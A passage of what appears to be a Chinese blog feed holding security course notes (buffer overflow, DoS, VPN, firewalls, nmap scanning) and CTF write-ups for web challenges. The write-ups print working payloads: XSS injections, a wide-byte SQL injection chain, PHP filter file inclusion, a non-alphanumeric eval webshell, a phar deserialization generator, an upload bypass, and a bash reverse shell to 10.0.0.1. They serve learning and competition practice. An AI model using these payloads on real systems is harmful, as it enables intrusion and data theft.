printf(&quot;incorrect password!\n\n&quot;);    }else    {        printf(&quot;Congratulation! You have passed the verification!\n&quot;);        break;    }}}</code></pre><p><img src="https://i.imgur.com/padWTTf.png" alt=""><br>overflow1:小于7个字符时，authenticated值为-1，补码表示0xffffffff,输入字符超过7个字符，authenticated值最低位恰好被覆盖为0，通过验证。<br>程序会崩溃。<br><img src="https://i.imgur.com/I70no6J.png" alt=""></p><p>overflow2:将返回地址覆盖成验证通过的0x00401122,password文本输入，UltraEdit编辑，倒着输入0x00401122,通过验证，程序崩溃。</p><p>原因:<br><strong>EBP被覆盖为无效值，程序在退出时堆栈无法平衡，导致崩溃。</strong></p><h2 id="缓冲区溢出攻击的基本类型："><a href="#缓冲区溢出攻击的基本类型：" class="headerlink" title="缓冲区溢出攻击的基本类型："></a>缓冲区溢出攻击的基本类型：</h2><ul><li>栈溢出</li><li>堆溢出</li><li>BSS溢出</li><li>格式化串溢出</li><li>整数溢出</li></ul><h2 id="防御-4"><a href="#防御-4" class="headerlink" title="防御"></a>防御</h2><ol><li>避免源码中的相关bug（）</li><li>插入代码进行数组边界检查、 返回指针完整性检查</li><li>阻止攻击代码执行(非执行缓冲区技术、堆栈数据段不可执行)</li><li>加强系统防护（GS机制、SafeSEH、DEP）</li></ol><h1 id="第七章拒绝服务"><a href="#第七章拒绝服务" class="headerlink" title="第七章拒绝服务"></a>第七章拒绝服务</h1><h2 id="0x01-DOS攻击"><a href="#0x01-DOS攻击" class="headerlink" title="0x01 DOS攻击"></a>0x01 DOS攻击</h2><ol><li>概念：破坏性攻击，通过消耗可用系统资源、带宽资源或造成程序缓冲区溢出错误，致使系统无法正常服务。</li><li>类型:网络带宽攻击、连通性攻击、滥用合理的服务请求、利用传输协议缺陷、利用服务程序的漏洞</li></ol><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>1.Ping of Death</p><p>缓存溢出： ping -l 65540 192.168.1.140</p><p>2.泪滴（Teardrop）</p><p>分片攻击，数据分片后传送到目标主机后再到堆栈中进行重组。</p><p>3.泛洪类（Flood）<br>UDP泛洪： 利用主机自动回复的服务(echo、chargen),一方的输出成为另一方的输入。</p><pre><code>SYN泛洪：利用TCP协议缺陷，发送大量伪造的TCP连接请求。ACK泛洪Connection泛洪HTTP Get 泛洪</code></pre><p>4.Land攻击(源地址和目标地址相同)<br>5.Smurf攻击(源为攻击主机地址，目的为广播地址，ICMP )<br>6.Fraggle攻击(Smurf区别为UDP)<br>7.畸形消息攻击<br>8.Slashdot effect<br>9.WinNuke攻击（攻击目标端口）  </p><h2 id="防御-5"><a href="#防御-5" class="headerlink" title="防御"></a>防御</h2><p>SYN防御：缩短SYN Timeout时间、设置SYN Cookie、负反馈策略、退让策略、退让策略、 防火墙</p><p>拒绝服务攻击的防御困难之处——不容易定位攻击者。</p><p>防御方法： 有效完善的设计、带宽限制、及时给系统安装补丁、运行尽可能少的服务、只允许必要的通信、封锁敌意IP地址</p><h2 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h2><p>DDOS原理：通过控制分布在网络各处的数百甚至数万台傀儡主机（肉机），<br>发动它们同时向攻击目标进行DoS攻击。</p><h1 id="第八章身份认证"><a href="#第八章身份认证" class="headerlink" title="第八章身份认证"></a>第八章身份认证</h1><h2 id="AAA"><a href="#AAA" class="headerlink" title="AAA"></a>AAA</h2><ul><li>认证：在做任何动作之前必须要识别动作执行者的真实身份。又称为鉴别、确认。</li><li>授权：用户身份被确认合法后，赋予该用户进行文件和数据等的操作权限</li><li>审计/记账：每一个人都应该为自己所做的操作负责，所以在做完<br>事情之后都要留下记录，以便核查责任</li></ul><h3 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h3><ul><li>简单口令认证</li><li>基于单向函数的口令认证</li></ul><ul><li>一次性口令认证<br>防止重放攻击；基于客户端/服务器模式；</li></ul><ol><li>连接请求</li><li>返回seed,seq(服务器seq-1)</li><li>输入口令，口令+seed做seq次hash；</li><li>服务器存储用户上次登录得一次性口令，hash依次比较，一致通过，覆盖口令</li></ol><h1 id="第九章VPN"><a href="#第九章VPN" class="headerlink" title="第九章VPN"></a>第九章VPN</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>VPN是在公共网络上传输私有通信的方法。VPN通常使用（加密的）隧道将两个或多个专用网络连接起来。</p><h2 id="层次和类型"><a href="#层次和类型" class="headerlink" title="层次和类型"></a>层次和类型</h2><p><img src="https://i.imgur.com/C8f4S3m.png" alt=""></p><h2 id="隧道协议"><a href="#隧道协议" class="headerlink" title="隧道协议"></a>隧道协议</h2><p><img src="https://i.imgur.com/dJouaKB.png" alt=""><br><img src="https://i.imgur.com/G8bPgEX.png" alt=""></p><h2 id="IPSec"><a href="#IPSec" class="headerlink" title="IPSec"></a>IPSec</h2><p>概念：用于构建VPN的一系列协议。为提供加密安全服务而开发，支持认证、完整性、访问控制以及数据一致性。只允许IP数据的封装和加密。</p><p>组成：</p><ul><li>Internet密钥交换协议（IKE）</li><li>封装协议<ol><li>负载安全封装</li><li>认证报头协议<br><img src="https://i.imgur.com/ZdSOJCX.png" alt=""></li></ol></li></ul><h1 id="第十章防火墙"><a href="#第十章防火墙" class="headerlink" title="第十章防火墙"></a>第十章防火墙</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><ul><li>防火墙(firewall)是位于两个(或<br>多个)网络间实施网间访问控制的组件的集合</li><li><p>防火墙通常是单独的计算机、路由器或专有硬件设备，充当访问网络的唯一入口点</p></li><li><p>防火墙实现数据流控制通过预先设定安全规则来实现，安全规则由匹配条件和处理方式两部分组成。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>使用对象分类:</p></li><li><p>个人防火墙</p></li><li><p>企业防火墙<br>技术分类：</p></li><li><p>包过滤防火墙(静态包和动态包)</p></li><li>代理技术（应用层代理和电路级网关）</li><li>混和型防火墙</li></ul><hr><p>后续实践</p><h1 id="扫描-1"><a href="#扫描-1" class="headerlink" title="扫描"></a>扫描</h1><p>whois 163.com</p><p>nslookup<br>server dns.cumt.edu.cn   //指定域名服务器<br>set class=any  //设置类型<br>cs.cumt.edu.cn //查询主机host</p><p>dig 163.com    //域名解析</p><p>firece dns cumt.edu.cn   //dns扫描</p><p>host 163.com  //  ip-主机名</p><p>tracert 163.com    //路由追踪</p><h2 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h2><pre><code>nmap -sP 目标阻断ICMP包可换 TCP进行ping  nmap -PT 80</code></pre><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>主动连接目标系统的TCP和UDP端口以确定哪些服务正在运行或处于LISTENING（监听）状态。</p><pre><code>- TCP Connect()扫描;nmap -sT- TCP SYN扫描(半开扫描;nmap -sS)：向目标端口送SYN数据包 - TCP FIN扫描(秘密扫描;nmap -sF): 向目标端口发送FIN数据包(-xX -sN)- TCP ACK扫描(nmap -sA),测试防火墙的规则集, 不能用来确定端口是否开放或者关闭- TCP窗口扫描(nmap -sW): 测试特定目标系统（如AIX和FreeBSD系统）上的端口是否开放、被过滤- TCP Maimon扫描(nmap -sM) ：探测报文改为FIN/ACK外，其原理与TCP FIN扫描一样；无论端口是否开放，都应响应RST报文-  UDP扫描(nmap -sU) ：向目标端口发出UDP数据包-  激进扫描 ： nmap –A 控制时间：nmap –T(0-5) </code></pre><h2 id="旗标抓取-1"><a href="#旗标抓取-1" class="headerlink" title="旗标抓取"></a>旗标抓取</h2><pre><code>telnet www.cumt.edu.cn 80nc -v 163.com 80</code></pre><h3 id="密码修改"><a href="#密码修改" class="headerlink" title="密码修改"></a>密码修改</h3><pre><code>su su -passwd</code></pre><h3 id="修改文件权限："><a href="#修改文件权限：" class="headerlink" title="修改文件权限："></a>修改文件权限：</h3><pre><code>chmod 777 file/chmod a=rwx file  chmod ug=rwx,o=x file/chmod 771 file  </code></pre><p>若要rwx属性则4+2+1=7；<br>若要rw-属性则4+2=6；<br>若要r-x属性则4+1=5。</p><h3 id="修改用户账户"><a href="#修改用户账户" class="headerlink" title="修改用户账户"></a>修改用户账户</h3><pre><code>usermod [-LU][-c &lt;备注&gt;][-d &lt;登入目录&gt;][-e &lt;有效期限&gt;][-f &lt;缓冲天数&gt;][-g &lt;群组&gt;][-G &lt;群组&gt;][-l &lt;帐号名称&gt;][-s &lt;shell&gt;][-u &lt;uid&gt;][用户帐号]</code></pre><p>更改登录目录</p><pre><code>usermod -d /home/hnlinux root</code></pre><p>改变用户的uid</p><pre><code>usermod -u 777 root</code></pre><h1 id="欺骗"><a href="#欺骗" class="headerlink" title="欺骗"></a>欺骗</h1><pre><code>arp -a //缓存表arp -s 192.168.1.254 00-0f-7a-02-00-4b //设置静态</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概论&quot;&gt;&lt;a href=&quot;#概论&quot; class=&quot;headerlink&quot; title=&quot;概论&quot;&gt;&lt;/a&gt;概论&lt;/h1&gt;&lt;h2 id=&quot;安全主要威胁&quot;&gt;&lt;a href=&quot;#安全主要威胁&quot; class=&quot;headerlink&quot; title=&quot;安全主要威胁&quot;&gt;&lt;/a&gt;安
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>南邮CTF</title>
    <link href="http://yoursite.com/2018/11/13/%E5%8D%97%E9%82%AE/"/>
    <id>http://yoursite.com/2018/11/13/南邮/</id>
    <published>2018-11-13T12:20:36.606Z</published>
    <updated>2018-12-07T13:35:01.461Z</updated>
    
    <content type="html"><![CDATA[<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>查看源码<br><code>nctf{flag_admiaanaaaaaaaaaaa}</code></p><h1 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h1><p>弱类型比较<br>==和===<br>==先转化为一致的类型比较。<br>===比较类型在比较字符串<br>构造md5(‘240610708’)=md5(‘QNKCDZO’)<br>payload：<code>http://chinalover.sinaapp.com/web19?a=240610708</code></p><h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><p>burp抓包，修改login=1;<br><img src="https://i.imgur.com/HJmHJ44.png" alt=""></p><h1 id="单身20年"><a href="#单身20年" class="headerlink" title="单身20年"></a>单身20年</h1><p>查看源码发现search_key.php，Burp抓包拿flag</p><h1 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h1><p>常用伪造方法：</p><pre><code>Client-Ip: 127.0.0.1X-Forwarded-For: 127.0.0.1Host: 127.0.0.1Referer: www.google.com</code></pre><h1 id="单身100年"><a href="#单身100年" class="headerlink" title="单身100年"></a>单身100年</h1><p>Burp抓包，发现index.php,提交查看响应头。<br><code>flag: nctf{this_is_302_redirect}</code></p><h1 id="这题不是Web"><a href="#这题不是Web" class="headerlink" title="这题不是Web"></a>这题不是Web</h1><p>源码中有gif图片，猜测隐藏在二进制文件中，直接拖到Winhex中看到flag</p><h1 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h1><p>密码口令zhimakaimen,查看源码发现限制最大长度10，放到Firefox Developers Tools中Edit html中，修改为11,输入zhimakaimen得到Flag;</p><h1 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h1><p><code>payload: http://chinalover.sinaapp.com/web17/index.php?a=QNKCDZO&amp;b=240610708</code><br>or<br><code>payload: a[]=1&amp;b[]=2</code></p><h1 id="x00"><a href="#x00" class="headerlink" title="\x00"></a>\x00</h1><p>@ereg处理字符串，构造nctf[]，传入数组返回NULL,NULL!==FALSE,绕过第一层，数组传入strpos，直接返回NULL，NULL!==FALSE，输出FLAG；<br><code>payload: nctf[]</code></p><h1 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h1><p><code>intval()</code>取整<br>MYSQL查询<br>注入参数ID<br>小数绕过</p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>提示LFI，想到文件包含，</p><pre><code>include()require()include_once()require_once()</code></pre><p>将包含文件作为PHP文件解析。<br>绕过技巧:<br>php伪协议:<br>php://filter</p><p>可以读取本地文件<br>index.php?file=php://filter/read=convert.base64-encode/resource=index.php<br>指定末尾文件，可以读到base64编码后的文件内容，ctf中常有题目可读文件源码。</p><p>php://phar</p><p>归档，解压缩协议。<br>指定相对路径<br><code>index.php?file=phar://shell.zip/phpinfo.txt</code><br>指定绝对路径<br><code>index.php?file=phar://D:/index/www/fileinclude/shell.zip/phpinfo.txt</code></p><p>payload:<code>http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php</code></p><h1 id="php-decode"><a href="#php-decode" class="headerlink" title="php decode"></a>php decode</h1><p>base64_decode解码字符串<br>字符串ascii-1转化成字符串最后输出</p><p>区分eval和echo，前者将字符串当PHP代码执行，echo输出一个或多个字符串。</p><p>修改eval为echo</p><h1 id="单身一百年也没有用"><a href="#单身一百年也没有用" class="headerlink" title="单身一百年也没有用"></a>单身一百年也没有用</h1><p>点进去发现flag变化，BURP截包GO，响应头有Flag,考察301重定向问题。</p><h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><p>extract()将变量从数组导入当前符号表</p><p>方便特性：<br>用于数组<br><code>extract()，它的主要作用是将数组展开，键名作为变量名，元素值为变量值，</code></p><p>POST数值时，会进行变量覆盖，extract($_GET,EXTP_SKIP)跳过覆盖。</p><p>查看source.php，构造$pass == $thepassword_123即可。利用extract()可覆盖特性。进行全局变量修改。</p><p>拿flag;</p><h1 id="pass-check"><a href="#pass-check" class="headerlink" title="pass check"></a>pass check</h1><p>查看提示，strcmp()返回0可输出flag；由此可想到利用strcmp漏洞,POST只能上传字符串类型，如果构造一个数组，在5.3之前php中，将return 0;虽然报错，却判定相等。</p><p><code>payload:pass[]=1</code></p><h1 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h1><p>basename[]返回路径中得文件名部分。<br>上传一个evil.jpg文件，抓包，发现提示<br><img src="https://i.imgur.com/Bg2sOGU.png" alt=""><br>发现不是php文件。</p><p>思路：检验为php文件发现是通过basename,在/uploads/目录下。<br>由此可以构造./uploads/evil.php上传后发现变成evil.phpevil.jpg，由此可以想到利用0x00截断，构造出evil.php，绕过验证。</p><h1 id="起名字真难"><a href="#起名字真难" class="headerlink" title="起名字真难"></a>起名字真难</h1><p>审计代码发现</p><h1 id="sqlinjection3"><a href="#sqlinjection3" class="headerlink" title="sqlinjection3"></a>sqlinjection3</h1><p>宽字节注入。 利用%df%5c形成汉字。绕过\<br>爆库<br><a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&#39;" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&#39;</a> union select 1,database()%23  查出数据库为sae-chinalover，转化为16进制0x7361652d6368696e616c6f766572<br>爆表<br><a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&#39;" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&#39;</a> union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x7361652d6368696e616c6f766572%23<br>爆列<br><a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&#39;" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&#39;</a> union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634%23<br>爆字段<br><a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&#39;" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&#39;</a> union select 1,flag from ctf4%23</p><h1 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h1><p>脑洞题。看了Writeup发现访问404.html。查看源码隐藏着flag;</p><h1 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h1><p>看到URL中user1=Y3RmdXNlcg%3D%3D,进行URL解码，然后发现base64加密。解密后得到ctfuser,提示说要重置admin的密码，放到burp里修改user1=YWRtaW4%3d,将user=admin.</p><h1 id="sqlinjection-4"><a href="#sqlinjection-4" class="headerlink" title="sqlinjection 4"></a>sqlinjection 4</h1><p>php中双引号会替换变量的值，而单引号会把它当做字符串输出。</p><p>get_magic_quotes_gpc()里使用了stripslashes(str)，在if条件中未执行。<br>查询语句为</p><p><code>$query=&#39;SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;&#39;;</code><br>因此要通过\转义符来去掉后面的’，构造<br><code>http://chinalover.sinaapp.com/web15/index.php?username=\&amp;password=or 1=1%23</code></p><p>查询语句变成<br><code>SELECT * FROM users WHERE name=&#39;\&#39;AND pass=&#39;or 1=1#;&#39;</code></p><h1 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h1><p>aaencode解码，然后访问1bc29b36f623ba82aaf6724fd3b16718.php,提示在头里，查看Headers，发现tip:.history of bash,搜索发现Linux 命令行历史记录在.bash_history，然后访问，发现存在zip压缩包，访问下载拿到flag;</p><h1 id="密码重置2"><a href="#密码重置2" class="headerlink" title="密码重置2"></a>密码重置2</h1><p>提示很明显了。查看源码发现管理员邮箱，Linux下异常退出会留下b备份文件.submit.php.swp，访问之后看到token验证机制。长度等于10且等于0；想到科学记数法构造token 0e00000000;bypass之后得到flag;</p><p>#</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h1&gt;&lt;p&gt;查看源码&lt;br&gt;&lt;code&gt;nctf{flag_admiaanaaaaaaaaaaa}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&quot;md5&quot;&gt;&lt;a
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>D0g3 Game Writeup</title>
    <link href="http://yoursite.com/2018/11/11/D03games/"/>
    <id>http://yoursite.com/2018/11/11/D03games/</id>
    <published>2018-11-11T09:14:22.389Z</published>
    <updated>2018-12-19T13:58:34.160Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss1"><a href="#xss1" class="headerlink" title="xss1"></a>xss1</h1><ol><li>标签之内<br><code>&lt;input type=&quot;text&quot; value=&quot;[输出]&quot;/&gt;</code>  </li><li>闭合属性,onmouseover事件触发脚本<br><code>&quot; onmouseover=alert(1) x=</code><br>闭合属性后闭合标签，执行脚本<br><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>  </li><li>输入类型为隐藏的输入字段<br><code>&lt;input type=&quot;hidden&quot; value=&quot;[输出]&quot; /&gt;</code><br>输入<br><code>1&quot; onmouseover=alert(1) type=&quot;text</code>闭合   </li><li>在src/href/action属性内<br><code>javascript:alert(1)//</code>   </li><li>成为Javascript值<br>输入在脚本内<code>&lt;script&gt;a=&quot;[输出]&quot;;...&lt;/script&gt;</code><br><code>&lt;/script&gt;&lt;/script&gt;alert(1)//</code><br><code>&quot;;alert(1);//</code>   <h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><code>@eval($code)</code><br>字符串按照PHP代码执行<br>利用非字母数字构造，执行Flag()函数得到flag,限制长度为50，构造GET变量，传入参数执行函数。不包含数字和字母获取webshell,<br>参考博文<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener"></a></li></ol><p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html" target="_blank" rel="noopener"></a></p><p>构造</p><p><img src="https://i.imgur.com/8r9Nrqx.png" alt=""></p><p>php执行命令`和Linux通配符?<br>$_GET[￠]获取参数值</p><p>payload:</p><pre><code>http://120.79.33.253:9000/index.php?code=$￠=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$￠}[￠](${$￠}[￠￠]);&amp;￠=Flag</code></pre><h1 id="matchit"><a href="#matchit" class="headerlink" title="matchit"></a>matchit</h1><pre><code class="php">&lt;?phppreg_match_all(&quot;|&lt;[^&gt;]+&gt;(.*)&lt;/[^&gt;]+&gt;|U&quot;,    &quot;&lt;b&gt;example: &lt;/b&gt;&lt;div align=left&gt;this is a test&lt;/div&gt;&quot;,    $out, PREG_PATTERN_ORDER);echo $out[0][0] . &quot;, &quot; . $out[0][1] . &quot;\n&quot;;echo $out[1][0] . &quot;, &quot; . $out[1][1] . &quot;\n&quot;;?&gt;//&lt;b&gt;example: &lt;/b&gt;, &lt;div align=left&gt;this is a test&lt;/div&gt;example: , this is a test</code></pre><p>out[0]匹配完整模式字符串数组，out[1]包含闭合标签内的字符串数组。</p><p>PHP字符簇<br>[[:alpha:]]任何字母<br>[[:digit:]]任何数字<br>其余类似</p><p>由代码可知，限制password条件<br>password=42;<br>password长度大于12；<br>password至少匹配<img src="https://i.imgur.com/rSWrlec.png" alt=""><br>3次以上<br>用科学计数法绕过</p><h1 id="wafupload"><a href="#wafupload" class="headerlink" title="wafupload"></a>wafupload</h1><p>分析代码<br><img src="https://i.imgur.com/nrl2dvG.png" alt=""><br>主要限制为白名单后缀名检测，如果文件名不存在用上传文件名，<br>end($file)获取数组最后一个元素检查后缀名，[第一个数组元素]+[数组长度-1]值构成新的文件名。</p><p>利用关联数组绕过检查并构造PHP可执行文件。<br><code>$filename = array(1=&gt;&#39;php&#39;,0=&gt;&#39;jpg&#39;);</code><br>构造<br><img src="https://i.imgur.com/81XIYqN.png" alt=""><br>上传后连接菜刀获取Flag;<br><code>D0g3{18be1a4914ab770a57d5ac92427bcfaf}</code></p><h1 id="不认真的upload"><a href="#不认真的upload" class="headerlink" title="不认真的upload"></a>不认真的upload</h1><p><img src="https://i.imgur.com/CwGjirL.png" alt=""><br>上传gif的得到flag.php<br>访问flag.php发现<br><img src="https://i.imgur.com/KAs0Sek.png" alt=""><br>参考phar对象漏洞。<br><a href="https://paper.seebug.org/680/#23-phar" target="_blank" rel="noopener">https://paper.seebug.org/680/#23-phar</a></p><pre><code>&lt;?php     class flag {         public $file=&#39;phar&#39;;     }    @unlink(&quot;phar.phar&quot;);    $phar = new Phar(&quot;phar.phar&quot;);  //实例一个phar对象    $phar-&gt;startBuffering(); //开始缓冲写操作    $phar-&gt;setStub(&quot;GIF9a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //增加gif文件头，a  stub为一个标志    $o =new flag();     $phar-&gt;setMetadata($o);   //将自定义的meta-data存入manifest    $phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);   //添加要压缩文件    $phar-&gt;stopBuffering();?&gt;</code></pre><p>生成phar.phar文件，然后上传修改后缀名。<br>访问.<br>payload:<code>http://206.189.214.99:2080/flag.php?filename=phar://upload_file/phar.gif</code></p><h1 id="爆破拿flag"><a href="#爆破拿flag" class="headerlink" title="爆破拿flag"></a>爆破拿flag</h1><p>Burp暴力破解<br>12568响应不同，访问获取flag</p><h1 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars"></a>htmlspecialchars</h1><p>javascript:伪协议；<br>url主体是javascript代码，由javascript解释器运行。;隔开语句。<br>onfocus:对象获得焦点执行。</p><p><code>http://120.79.33.253:9004/?id=111&#39;onmouseover=&#39;javascript:alert(111)</code><br>其他payload:<br><code>1&#39;+onfocus=location=this.name+autofocus+name=&#39;javascript:alert(111)</code><br><code>111&#39;+onfocus=alert(111)+&#39;</code><br><code>111&#39;+onclick=alert(111)+&#39;</code></p><h1 id="BabyFirstRevenge"><a href="#BabyFirstRevenge" class="headerlink" title="BabyFirstRevenge"></a>BabyFirstRevenge</h1><p>Kali修改语言<br>dpkg-reconfigure locales<br>选择字符编码;<br>reboot<br><code>&gt;</code> 结果存入文件<br><code>&gt;&gt;</code>文件内容后追加内容<br><code>\</code>换行，可将一条命令卸载多行<br><code>sh</code> 执行shell脚本<br><code>ls -t</code> 文件按时间顺序排列<br><code>ls -t&gt;</code>可绕过长度限制<br>参考博文<br><a href="https://xz.aliyun.com/t/2748" target="_blank" rel="noopener">https://xz.aliyun.com/t/2748</a></p><p>官方构造</p><pre><code> # generate `ls -t&gt;y` file&#39;&gt;ls\\&#39;, &#39;ls&gt;_&#39;, &#39;&gt;\ \\&#39;, &#39;&gt;-t\\&#39;, &#39;&gt;\&gt;y&#39;, &#39;ls&gt;&gt;_&#39;, </code></pre><p>bash反弹shell参考<a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a><br><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></p><p>后面继续更新。<br><img src="https://i.imgur.com/bzHbCnY.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;xss1&quot;&gt;&lt;a href=&quot;#xss1&quot; class=&quot;headerlink&quot; title=&quot;xss1&quot;&gt;&lt;/a&gt;xss1&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;标签之内&lt;br&gt;&lt;code&gt;&amp;lt;input type=&amp;quot;text&amp;quot; value=&amp;quo
      
    
    </summary>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>php函数</title>
    <link href="http://yoursite.com/2018/11/07/ctf/"/>
    <id>http://yoursite.com/2018/11/07/ctf/</id>
    <published>2018-11-07T15:35:27.583Z</published>
    <updated>2018-12-19T13:58:06.088Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php函数"><a href="#php函数" class="headerlink" title="php函数"></a>php函数</h1><p>strpos 返回字符串首次出现位置<br>stripos 返回字符串首次出现位置不区分大小写<br>highlight_file()对文件进行高亮显示</p><h1 id="serialize与unserialize"><a href="#serialize与unserialize" class="headerlink" title="serialize与unserialize"></a>serialize与unserialize</h1><p>unserialize函数在重构对象后自动调用_wakeup成员方法，<br>跳过_wakeup执行，序列化字符串中，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup的执行。</p><p><code>O:&lt;length&gt;:&quot;&lt;class name&gt;&quot;:&lt;n&gt;:{&lt;field name 1&gt;&lt;field value 1&gt;&lt;field name 2&gt;&lt;field value 2&gt;...&lt;field name n&gt;&lt;field value n&gt;}</code></p><h1 id="js函数"><a href="#js函数" class="headerlink" title="js函数"></a>js函数</h1><p><code>JSON.parse()方法解析JSON字符串，构造字符串描述的JavaScript值或对象</code><br><code>setInterval</code><br>定时执行</p><pre><code class="javascript">var i=1var timer=setInterval(function(){    console.log(2);},1000)   </code></pre><p>参数确保执行结束之后的时间开始。</p><p><code>escape()</code> URL编码<br><code>unescape()</code> URL解码</p><p>XMLHttpRequest(XHR)对象与服务器交互，可以从URL获取数据</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;php函数&quot;&gt;&lt;a href=&quot;#php函数&quot; class=&quot;headerlink&quot; title=&quot;php函数&quot;&gt;&lt;/a&gt;php函数&lt;/h1&gt;&lt;p&gt;strpos 返回字符串首次出现位置&lt;br&gt;stripos 返回字符串首次出现位置不区分大小写&lt;br&gt;highlig
      
    
    </summary>
    
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>bxs网络平台</title>
    <link href="http://yoursite.com/2018/10/29/%E7%9F%BF%E5%A4%A7%E7%BD%91%E7%BB%9C%E5%AE%9E%E8%AE%AD%E5%B9%B3%E5%8F%B0md/"/>
    <id>http://yoursite.com/2018/10/29/矿大网络实训平台md/</id>
    <published>2018-10-29T11:24:22.645Z</published>
    <updated>2018-11-08T11:31:53.199Z</updated>
    
    <content type="html"><![CDATA[<p>WebWriteup </p><h1 id="Logic"><a href="#Logic" class="headerlink" title="Logic"></a>Logic</h1><ol><li>Burp抓包发现管理员账号<a href="mailto:chenyurui@gmail.com" target="_blank" rel="noopener">chenyurui@gmail.com</a><br><img src="https://i.imgur.com/OhqGoA4.png" alt=""></li><li>看到隐藏信息。Vim编辑.</li><li>验证转入submit.php.</li><li>访问./submit.php发现不是管理员。<br>根据Vim备份漏洞，存在隐藏文件.swp,访问./submit.php.swp<br>访问之后查看源码，构造Token值绕过验证.</li></ol><p><img src="https://i.imgur.com/NWrjtvV.png" alt=""></p><p><code>payload:http://bxs.cumt.edu.cn/challenge/web/logic/submit.php?emailAddress=chenyurui@gmail.com&amp;token=0e00000000</code></p><h1 id="听说你会面向对象"><a href="#听说你会面向对象" class="headerlink" title="听说你会面向对象"></a>听说你会面向对象</h1><p>看到<br><img src="https://i.imgur.com/Afn9U5S.png" alt=""><br>想到反序列化漏洞，构造<img src="https://i.imgur.com/ChD7QBI.png" alt=""><br>结果执行了_wakeup函数，要绕过他的执行，经过查资料如果对象属性个数大于真实属性时会跳过，故修改</p><p><code>O:5:&quot;Admin&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}为O:5:&quot;Admin&quot;:2:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p><p>payload:<code>http://bxs.cumt.edu.cn/challenge/web/php_object_injection/index.php?data=O:5:&quot;Admin&quot;:2:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p><h1 id="colorSnake"><a href="#colorSnake" class="headerlink" title="colorSnake"></a>colorSnake</h1><p>查看源码发现game.js，获取到只要不断访问页面，分数会上升<br><img src="https://i.imgur.com/EJfbVMD.png" alt=""><br>参考别人的思路发现可利用JS计时器。延时1秒，进行访问。代码如下<br>    